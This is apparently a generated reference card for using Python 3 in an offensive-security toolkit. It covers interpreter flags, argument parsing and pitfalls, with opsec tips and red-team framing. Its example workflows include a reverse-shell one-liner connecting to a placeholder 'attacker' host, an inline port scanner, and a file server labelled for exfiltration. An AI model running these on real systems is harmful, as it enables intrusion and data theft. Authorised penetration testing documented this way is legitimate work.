---
name: Python3
description: Python 3.10.12 interpreter for custom script development,
  prototyping exploits, network operations, and extending security tools.
registry: registry
tool_id: python3
category: other
tags:
  - scripting
  - automation
  - exploit-dev
  - network
  - data-processing
  - prototyping
  - utilities
mitre_techniques:
  - T1059.006
  - T1046
  - T1087
  - T1595
  - T1590
summary: "Python3 is invoked via `/usr/bin/python3` with no default args. Use
  for rapid script prototyping, custom exploit development, network interaction
  (sockets, HTTP requests), data parsing, brute-forcing, fuzzing, and automation
  during engagements. Execute one-liners with `-c 'code'`. Run scripts with
  `python3 script.py [args]`. Common libraries for offensive ops: socket,
  requests, scapy, subprocess, argparse, sys. Handle command-line args via
  sys.argv or argparse for option parsing. Use `-i` for interactive mode after
  script execution for debugging. Use `-u` for unbuffered output when piping or
  logging. Invoke with `-B` to avoid writing .pyc bytecode files (opsec). Python
  excels at network reconnaissance, protocol fuzzing, password cracking, web
  scraping, API interaction, payload generation, and gluing together multiple
  tools. Scripts should handle exceptions gracefully and provide clear error
  output. Expect most environments to have Python3 but verify standard library
  availability; assume no pip packages unless pre-installed in RTPI. Read stdin
  for pipeline integration. Write to stdout/stderr appropriately. Use shebang
  `#!/usr/bin/env python3` for standalone executable scripts. Check
  `sys.version_info` if version-specific features needed."
sources:
  - https://pyo3.rs/
  - https://docs.python.org/3/tutorial/index.html
  - https://www.python.org/doc/
  - https://www.codecademy.com/learn/learn-python-3
  - https://wiki.python.org/moin/BeginnersGuide
  - https://cs.stanford.edu/people/nick/py/python-main.html
  - https://commandlinux.com/man-page/man1/python/
  - https://realpython.com/python-command-line-arguments/
  - https://docs.python.org/3/library/argparse.html
  - https://www.codecademy.com/resources/docs/python/command-line-arguments
  - https://www.ucertify.com/p/learn-penetration-testing-with-python.html?srsltid=AfmBOopYk19Oq6Tui_vs86YPGF4kpI6GG8DYubzCwpyXoQ4QWXRqG8NU
  - https://www.ucertify.com/p/learn-penetration-testing-with-python.html?srsltid=AfmBOopaLdoZGuWYUG53i8a_2zQO9xI35OGKUA7fr85DWSZW-5bxwoth
generated_at: 2026-05-19T11:01:31.344Z
generated_by: anthropic
source_hash: 7b763137967cecaa521bae96f0ff0775210b6f14fd6f09bd0df91c966f866fe0
---

# Python3

## Overview

Python 3.10.12 general-purpose interpreted language. Pre-installed at /usr/bin/python3 in RTPI. Supports scripting, automation, network operations, exploit development, data manipulation, and tool extension. Rich standard library includes socket, http, subprocess, json, base64, hashlib, re, argparse. No external packages assumed; work with standard library unless RTPI includes specific pentesting modules (requests, scapy). Executes .py files or direct code via -c flag. Supports interactive REPL for experimentation.

## When to use

Use Python3 when existing tools lack required functionality or flexibility. Ideal for: custom network clients/servers, protocol fuzzing, API interaction, credential stuffing/brute-forcing, payload encoding/generation, log parsing, web scraping, data exfiltration formatting, chaining tool outputs, quick PoC exploits, automating repetitive tasks, extending Burp Suite or other tools with Python APIs. Choose Python over shell when complex data structures, error handling, or libraries (json, urllib, socket) needed. Use for multi-step attacks requiring state management. Avoid for performance-critical tasks (use compiled tools instead).

## Authentication & setup

No authentication required. Python3 is ready to execute immediately. Verify availability: `which python3` or `python3 --version`. Check installed modules: `python3 -c 'import sys; print(sys.path)'` shows library paths. Test critical imports before engagement: `python3 -c 'import socket, subprocess, json, base64, hashlib, argparse'`. If script requires specific modules not in standard library, verify RTPI includes them or adjust approach. Set executable permissions on standalone scripts: `chmod +x script.py`. Ensure shebang line `#!/usr/bin/env python3` present for direct execution. No configuration files needed for basic operation.

## Key commands / parameters

Invocation patterns: `python3 script.py` runs script file. `python3 -c 'print("hello")'` executes inline code (quote carefully in shell). `python3 -m module` runs library module as script (e.g., `python3 -m http.server 8000` for quick web server). `python3 -i script.py` runs script then drops to interactive mode for inspection. `python3 -u script.py` for unbuffered stdout/stderr (critical for real-time logging or piping). `python3 -B` prevents writing .pyc bytecode files (operational security). `echo 'code' | python3` reads from stdin. Options: `-h` shows help. `-V` shows version. `-O` optimizes (removes asserts). `-q` suppresses version banner in interactive mode. Command-line args passed after script name: `python3 tool.py -t 10.0.0.1 -p 443`. Access via sys.argv (list of strings) or parse with argparse module for robust option handling. Use `--` to separate Python options from script arguments if ambiguous.

## Example workflows

**Network scan**: `python3 -c "import socket; [print(f'{p} open') for p in range(20,1025) if socket.socket().connect_ex(('10.0.0.5', p))==0]"` (inline port scanner). **HTTP request**: `python3 -c "import urllib.request; print(urllib.request.urlopen('http://target/api').read())"`. **Base64 payload**: `python3 -c "import base64; print(base64.b64encode(b'payload').decode())"`. **Parse JSON API**: Script reads API response, extracts fields, formats for next tool. **Brute force script**: Reads wordlist from file, iterates credentials against SSH/HTTP/SMB using appropriate library. **Generate reverse shell**: `python3 -c 'import socket,subprocess; s=socket.socket(); s.connect(("attacker",443)); subprocess.run(["/bin/sh"], stdin=s.fileno(), stdout=s.fileno())'`. **Quick web server for exfil**: `python3 -m http.server 8080` serves current directory. **Encoding chain**: Read input, apply multiple encoding/encryption, output for injection. **Custom fuzzer**: Generate mutated inputs, send to target, monitor responses for anomalies.

## Output format

Output format depends entirely on script implementation. Standard Python prints to stdout via print() function. Use sys.stdout.write() for precise control. Print to stderr with print(msg, file=sys.stderr) or sys.stderr.write(). Scripts should output structured formats (JSON, CSV, TSV) for tool chaining rather than pretty-printed human text. Example JSON output: `json.dumps(results, indent=2)`. For interactive use, include progress indicators and error messages to stderr. Exit codes: 0 for success, non-zero for errors (set with sys.exit(code)). Logging: use logging module for levels (DEBUG, INFO, WARNING, ERROR). Capture exceptions and output meaningful error messages rather than raw tracebacks in production scripts. For binary data output, write to sys.stdout.buffer in binary mode.

## Common pitfalls

**Bytecode artifacts**: Running scripts creates .pyc files in __pycache__; use -B flag to prevent. **Buffering issues**: Output may not appear in real-time when piped; use -u for unbuffered or sys.stdout.flush(). **Exception handling**: Unhandled exceptions print tracebacks to stderr and exit; wrap risky operations in try/except. **Module availability**: Don't assume pip packages installed; verify or use standard library only. **String encoding**: Mixing bytes and strings causes TypeErrors; be explicit with .encode()/.decode(). **Path issues**: Scripts may not run from expected directory; use absolute paths or os.path. **Permissions**: Network operations may require root (raw sockets, ports <1024). **Timeout handling**: Network operations can hang indefinitely; set socket timeouts. **Command injection**: When using subprocess with shell=True, sanitize inputs to avoid injection. **Resource limits**: Opening many sockets/files can exhaust limits; close resources properly or use context managers. **Version differences**: Python 2 vs 3 syntax incompatible; RTPI uses Python 3, avoid 2.x patterns. **Argument parsing**: sys.argv is raw list including script name at [0]; use argparse for robust parsing.

## References

• https://docs.python.org/3/tutorial/index.html
• https://docs.python.org/3/library/argparse.html
• https://commandlinux.com/man-page/man1/python/
• https://realpython.com/python-command-line-arguments/
• https://cs.stanford.edu/people/nick/py/python-main.html
• https://www.python.org/doc/
• https://wiki.python.org/moin/BeginnersGuide
